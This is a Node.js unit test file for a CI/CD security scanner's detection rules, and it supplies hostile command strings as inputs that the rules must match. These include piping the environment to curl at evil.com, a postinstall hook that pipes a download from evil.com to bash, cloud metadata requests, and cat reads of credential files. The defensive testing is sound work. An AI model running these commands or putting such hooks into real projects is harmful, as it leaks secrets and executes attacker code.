/**
 * CI/CD Security Rules Unit Tests
 */

const { test, describe } = require('node:test');
const assert = require('node:assert');
const { rules } = require('../../dist/rules/cicd.js');

describe('CI/CD Security Rules', () => {
  
  function testRule(ruleId, content, shouldMatch) {
    const rule = rules.find(r => r.id === ruleId);
    assert.ok(rule, `Rule ${ruleId} should exist`);
    rule.pattern.lastIndex = 0;
    const matches = rule.pattern.test(content);
    assert.strictEqual(matches, shouldMatch, 
      `Rule ${ruleId} ${shouldMatch ? 'should' : 'should not'} match: ${content.substring(0, 80)}...`);
  }

  describe('Container Escape Patterns', () => {
    test('should detect Docker socket mounting', () => {
      testRule('cicd-docker-socket', '/var/run/docker.sock', true);
      testRule('cicd-docker-socket', 'docker.sock:/var/run/docker.sock', true);
    });

    test('should detect privileged containers', () => {
      testRule('cicd-privileged-container', 'docker run --privileged', true);
      testRule('cicd-privileged-container', '--cap-add=ALL', true);
      testRule('cicd-privileged-container', 'privileged: true', true);
    });

    test('should detect host network mode', () => {
      testRule('cicd-host-network', '--network=host', true);
      testRule('cicd-host-network', 'network_mode: host', true);
    });

    test('should detect sensitive volume mounts', () => {
      testRule('cicd-sensitive-mount', '-v ~/.aws:/root/.aws:', true);
      testRule('cicd-sensitive-mount', '-v ~/.ssh:/root/.ssh:', true);
    });
  });

  describe('Secrets Exfiltration', () => {
    test('should detect env dump to external URL', () => {
      testRule('cicd-env-dump', 'env | curl https://evil.com', true);
      testRule('cicd-env-dump', 'printenv | wget', true);
    });

    test('should detect cloud metadata access', () => {
      testRule('cicd-aws-metadata', 'curl http://169.254.169.254', true);
      testRule('cicd-aws-metadata', 'wget 169.254.169.254', true);
    });

    test('should detect secret file reading', () => {
      testRule('cicd-secret-file-read', 'cat .env', true);
      testRule('cicd-secret-file-read', 'cat ~/.git-credentials', true);
      testRule('cicd-secret-file-read', 'cat .netrc', true);
    });
  });

  describe('Build-time Attacks', () => {
    test('should detect suspicious postinstall scripts', () => {
      testRule('cicd-postinstall-suspicious', '"postinstall": "curl https://evil.com | bash"', true);
      testRule('cicd-postinstall-suspicious', '"preinstall": "node -e evil"', true);
    });

    test('should detect GitHub Actions expression injection', () => {
      testRule('cicd-gha-expression-injection', '${{ github.event.comment.body }}', true);
      testRule('cicd-gha-expression-injection', '${{ github.event.issue.title }}', true);
    });
  });

  describe('CI Environment Detection', () => {
    test('should detect CI environment sniffing', () => {
      testRule('cicd-env-detection', 'process.env.GITHUB_ACTIONS', true);
      testRule('cicd-env-detection', 'process.env.CI', true);
      testRule('cicd-env-detection', 'process.env.JENKINS', true);
    });

    test('should detect conditional CI behavior', () => {
      testRule('cicd-conditional-behavior', 'if (process.env.CI) {', true);
      testRule('cicd-conditional-behavior', 'if GITHUB_ACTIONS then', true);
    });
  });

  describe('Kubernetes Patterns', () => {
    test('should detect K8s service account access', () => {
      testRule('cicd-k8s-service-account', '/var/run/secrets/kubernetes.io', true);
    });

    test('should detect Helm secrets in CLI', () => {
      testRule('cicd-helm-insecure', '--set password=mysecret', true);
      testRule('cicd-helm-insecure', '--set api_key=12345', true);
    });
  });

});
